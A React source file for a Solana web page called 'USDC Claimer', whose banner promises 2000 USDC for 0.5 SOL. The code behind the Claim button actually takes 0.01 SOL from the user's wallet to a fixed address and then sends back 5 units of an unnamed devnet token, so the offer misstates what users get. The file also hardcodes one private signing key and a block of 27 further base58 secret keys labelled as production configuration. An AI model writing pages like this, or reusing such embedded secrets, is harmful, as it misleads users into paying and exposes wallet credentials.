/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "35wTL8JMx4cQYMSx7KhZwmaM15z23NJAWPj2JSs62xqQt1NLxeoowKSeiMpekt7XRYfoe3qNi3eEi2CWpnp6kipg"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "5QLN4upN3dtNuwLjdNuMVD3qE3KBUYb3cWJeCaNJ7BdTSkLMSq39ESV1nkDQUs5JmNwEbV3FLPmpdMzu2XFx3ybV",
  "key1": "5P4DxQrqzfTxabNPw2aUkZ6RT15qdtf15eeaRqxzZW4dyE7PMzSX3CX6M6K2vTwsTV3WmfHFYy2uzaNoSLFksKx6",
  "key2": "3HaEtpeVCVbenfdTGpmq5F3gvoLPMRWFQbEDWLQsf1EG9a7rkjRgCvaaaBGWL6E7E1Kv49rgmxxXa5ipxoQSMZyJ",
  "key3": "TH9DyLoE4dJZagUeFZ1poVB7okrExDdvj1Nywr9Jh7XKGnCmE6CKcTJ42ED6BTTtQuvoAQSA6zJGKYtrUmrufdu",
  "key4": "4GhwTZXCnCTsaDP97YGepwbBb7ZP8uYZvqN6NMFaWrRzBP5euRbW8AzfxHLMZ5pbNt7W8qdGrjSMrAsmZTc3BFyj",
  "key5": "54s4zwvXbJvdy47dcmAF4tnDSLoZiDfP7MiVVUxJ74oSa8GuetpxoJW98ooDNbAitMjBu42R6CF1nQjFoDFYPT4B",
  "key6": "5Po8DLsKv2DYXA7Qf9ZycxMi58AiHWJY7JS3H7M3WvKWK593Ke1NaQU6rgkVv4kbKcw1GRFBejBvF3faThSoKiqv",
  "key7": "5Hxfzsjo6AWqEEu2L7bFtCHokwcMqDdK95q3zoCKd6pzKeF6bTymDyyydM67TbjpFSEFe6n5CbcWHYu7H4kLJyu",
  "key8": "yRzcsfeMxsSJnCD2HDfuDhUZ287VkJg7R1AJB9aigrGct3YJT9udBzxdcaZui6rZSEofxrBmLHRcn8mZzZLiD64",
  "key9": "3e6obxR35L1d1o5C3WH9uKpipb5QDVZMx5S9dt1wxeUAoFxYujKZrDNHCXiXNx3EJXfPDYMfVwQ2uK3mRrVyeGqV",
  "key10": "43AbpYMqSfGXoFmsNYTthrQ1GdHmcwAs3hi9UhDe1dsuZQTGLxcAcmTHujCcKPKD7u7QMvXzmA6Bj4pdTBctZUmX",
  "key11": "2xyYW2MYZgZLoktTYsbMbTsHnBzGzYgVFRcGaG84kZMTbv4FChY5q5gexD2WTsqoiDgR2b18fy8ZkTDwyTKqBx6p",
  "key12": "jPN4kgp9vPDgvGRn7sESSnf6c6SrATJpX5oSDF1QChspLuQnyL9eAyb1vmDu85VX8FmR7qYnyZ2w8VcGaJEhBTK",
  "key13": "49jKbSNWDaa2T8ujRRfpDuDuhAGcF4z3pAs5PXCzAVVWL8aZk7PQHWbue2gN58jP3RZubXtTs5UTfYa3a97fbiXT",
  "key14": "3wDcSK7Lvr1ephotWXDjX5rgLCQPihdaoAiam37ZgWeTnXRJSrxioAWNquWW2UkbW4PKFrGsHTLXWQZHjUAKXzpH",
  "key15": "3sXgjmjq6WjUK41YccD3aR6mPP5pWCJNGeRkYY5MueKDjUfDi5mPMRN5w8baPP7HVbMCC8rERG5hKToJGF5uGg74",
  "key16": "3c3kmqm2ThXJfjNqPatSXsB2Lsfwbk24H1RiLA93zoyCP3yuUX3C2kShG4d335XktrxN5JymGuAi41bkAiM4LjHc",
  "key17": "4MFnHrBtKWq7esnwM66pZpGNEBHxjcorQpyZexZNFBR1NB7MKpWg2apUPhUk1YXNCb8yMMkLQtPiwWWZKoWp7qqC",
  "key18": "61fqnpZxkzuxidYYnH3hANzs7y7nCdbXwgZMjkBKCmPgwy4fYguuywL8f2nY7HigTwYe3xs4gLrFmYb2UpscqXBs",
  "key19": "2URRAe93BhRHcc5aULgDFUch3D7VSTG49JTYgSQJcEkFicdS6GANaPhGBQGs7TnCeuanZU3RFKBWLu7oDdqYpoik",
  "key20": "UCgL2Uz5jWnkht4u8U6RbAPTJDB1qoSbVDviszM8v2UPTKMoVJZiC4eJ9wHqiU4qWdUYXV2XrGeDriTpvURof74",
  "key21": "TKpe5MnYouLfdDeF4kSd825mprp8D3aXju6pb8q5kiNKMjzmnzePLdmGmcfJuQV5fc6kcBcLD44jdXVKP6Wg8bE",
  "key22": "5Yhihe1cqAgyXjQuohthnQKkNLHkxhsnM4aSqJSE6tLomTukpAqLGhG8jm76CT4LJxSf37doYisNz7pfqBn6tzL4",
  "key23": "5sUnVnKYkhMhTBepYe8VqrSW3cuBkehgdfKbUjVDsxjjunr354MmPSJtrdocDStd5fdiCfSeXvzEiSrvUtyGNGvE",
  "key24": "dQGtrtV9w3Z8YMfvbAV3XNX2jBCu2KYn4BCaJF5ZTvptcK7jkPN1h1EfWQXatNafiL4qgx4H3DUpmMCFapLvab8",
  "key25": "3wmnxbxRqC1nB7Gjn7pV8NZS88bqFVJvdC28HZ37L3XKcjZuWVme7aUKYTDag5PtkBr4CPEfW6neDtLzdM9VzXQ3",
  "key26": "qZAhHSDJgE8HuD3tfXcu5hoWfFGQvsgTXGHNkDhaNgMWcQKz39PZ1okfcxmcAtbE4SPbLU1RYnRES67nUixVKvQ"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
